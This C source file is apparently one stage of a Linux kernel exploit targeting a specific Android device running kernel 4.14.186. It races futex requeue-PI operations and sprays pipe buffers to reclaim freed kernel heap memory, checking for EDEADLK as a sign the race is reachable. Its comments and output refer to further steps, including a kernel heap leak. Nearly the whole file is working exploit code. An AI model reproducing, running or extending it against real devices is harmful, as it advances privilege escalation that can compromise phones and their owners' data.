/*
 * y75_pipe_probe.c — Step 5 RECLAIM-ONLY probe via pipe_buffer (V2 robust)
 * V2117 MT6781 4.14.186  waiter futex_requeue sp+0x78 lock sp+0xb0 frame 0x140
 * msgget filtered (ENOSYS) on this ROM — pipe is the heap primitive.
 *
 * Fixed vs V1: keeps pipe fds open until after race (real reclaim), but
 * limits to 16+16, uses alarm(8) so no hang survives, smaller F_SETPIPE_SZ,
 * and child _exits even if waiter stalls.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <linux/futex.h>
#include <stdint.h>
#include <stdatomic.h>
#include <time.h>

#define PIPE_PRE  16
#define PIPE_POST 16

static uint32_t fw, ft, fc;
static atomic_int ready, waiting, started, consumed;
static atomic_int requeue_errno, waiter_errno;

static void *th_owner(void *a){ (void)a;
    syscall(SYS_futex,&ft,FUTEX_LOCK_PI,0,NULL,NULL,0);
    atomic_store(&ready,1);
    while(!atomic_load(&started)) usleep(200);
    syscall(SYS_futex,&fc,FUTEX_LOCK_PI,0,NULL,NULL,0);
    // keep pi_chain locked — do not unlock, just sleep so waiter stays queued
    while(!atomic_load(&consumed)) sleep(1);
    return NULL;
}
static void *th_waiter(void *a){ (void)a;
    syscall(SYS_futex,&fc,FUTEX_LOCK_PI,0,NULL,NULL,0);
    atomic_store(&ready,1);
    while(!atomic_load(&started)) usleep(200);
    struct timespec ts; clock_gettime(CLOCK_MONOTONIC,&ts); ts.tv_sec+=3;
    atomic_store(&waiting,1);
    errno=0; int r=syscall(SYS_futex,&fw,FUTEX_WAIT_REQUEUE_PI,0,&ts,&ft,0);
    atomic_store(&waiter_errno, r==-1?errno:0);
    while(!atomic_load(&consumed)) usleep(500);
    return NULL;
}

static int run_round(int round){
    fw=0;ft=0;fc=0;
    atomic_store(&ready,0); atomic_store(&waiting,0);
    atomic_store(&started,0); atomic_store(&consumed,0);
    atomic_store(&requeue_errno,0); atomic_store(&waiter_errno,0);
    alarm(8); // watchdog — child will SIGALRM and _exit(2) if hung

    // keep pipes alive across the race
    int pre_fds[PIPE_PRE*2]; int pre_cnt=0;
    char *buf=malloc(4096); memset(buf, 'A'+(round%6), 4096);
    for(int i=0;i<PIPE_PRE;i++){
        int p[2]; if(pipe(p)==-1) break;
        // best-effort enlarge, ignore failure
        fcntl(p[0], 1031, 16*4096);
        fcntl(p[1], 1031, 16*4096);
        if(write(p[1], buf, 4096)!=4096){ close(p[0]);close(p[1]); break; }
        pre_fds[pre_cnt*2]=p[0]; pre_fds[pre_cnt*2+1]=p[1]; pre_cnt++;
    }
    printf("[*] pre-spray %d pipes\n", pre_cnt);

    pthread_t to,tw;
    pthread_create(&to,NULL,th_owner,NULL);
    pthread_create(&tw,NULL,th_waiter,NULL);
    while(!atomic_load(&waiting) || !atomic_load(&started)) usleep(500);
    usleep(50000);
    // mark started so owner takes pi_chain
    atomic_store(&started,1);
    // small window then requeue
    usleep(50000);
    errno=0; long r=syscall(SYS_futex,&fw,FUTEX_CMP_REQUEUE_PI,1,(void*)1,&ft,0);
    int re=r==-1?errno:0; atomic_store(&requeue_errno,re);

    int post_fds[PIPE_POST*2]; int post_cnt=0;
    for(int i=0;i<PIPE_POST;i++){
        int p[2]; if(pipe(p)==-1) break;
        fcntl(p[0],1031,16*4096); fcntl(p[1],1031,16*4096);
        if(write(p[1], buf, 4096)!=4096){ close(p[0]);close(p[1]); break; }
        post_fds[post_cnt*2]=p[0]; post_fds[post_cnt*2+1]=p[1]; post_cnt++;
    }
    free(buf);
    printf("[*] post-spray %d pipes\n", post_cnt);

    // wait for waiter to time out (3s) + margin
    usleep(3500000);
    atomic_store(&consumed,1);
    pthread_join(tw,NULL);
    // owner is detached via consumed flag, give it a moment then detach
    pthread_detach(to);
    alarm(0);
    int we=atomic_load(&waiter_errno);
    int hit=(we==35||re==35);
    printf("[*] Round %d: requeue errno %d waiter errno %d %s\n", round, re, we, hit?"HIT EDEADLK":"");
    for(int i=0;i<pre_cnt;i++){ close(pre_fds[i*2]); close(pre_fds[i*2+1]); }
    for(int i=0;i<post_cnt;i++){ close(post_fds[i*2]); close(post_fds[i*2+1]); }
    return hit;
}

int main(void){
    signal(SIGALRM, SIG_DFL);
    setbuf(stdout,NULL);
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0,&cs); sched_setaffinity(0,sizeof(cs),&cs);
    printf("\n=== Y75 pipe_buffer Step5 PROBE V2 — RECLAIM ONLY ===\n");
    printf("[*] V2117 4.14.186 waiter sp+0x78 lock sp+0xb0 | PIPE_PRE %d POST %d | msgget filtered\n\n", PIPE_PRE, PIPE_POST);
    { FILE *pf=fopen("/proc/sys/kernel/perf_event_paranoid","r"); int p=99;
      if(pf){ fscanf(pf,"%d",&p); fclose(pf);} printf("[*] paranoid %d\n",p); }
    int hits=0;
    for(int i=1;i<=6;i++){
        pid_t pid=fork();
        if(pid==0){
            // child alarm already set in run_round; also set outer
            alarm(10);
            int h=run_round(i);
            _exit(h?0:(waiter_errno==110?1:2));
        }
        int st; waitpid(pid,&st,0);
        if(WIFEXITED(st) && WEXITSTATUS(st)==0) hits++;
        else if(WIFEXITED(st)) printf("[*] round %d child exit %d (110=timeout no-EDEADLK)\n", i, WEXITSTATUS(st));
        else if(WIFSIGNALED(st)) printf("[*] round %d killed sig %d\n", i, WTERMSIG(st));
        usleep(400000);
        printf("\n");
    }
    printf("=== result %d/6 hit EDEADLK with pipe spray ===\n", hits);
    if(hits>=3) printf("[+] RECLAIM LIKELY — pipe keeps race reachable; step6 leak is safe to rehearse\n");
    else if(hits>0) printf("[*] spray ok but timing loose — retry\n");
    else printf("[-] no EDEADLK with spray — rerun race_oracle alone\n");
    printf("[*] No selinux/cred touched. Next: heap-leak reclaim (still reclaim-only).\n");
    return 0;
}
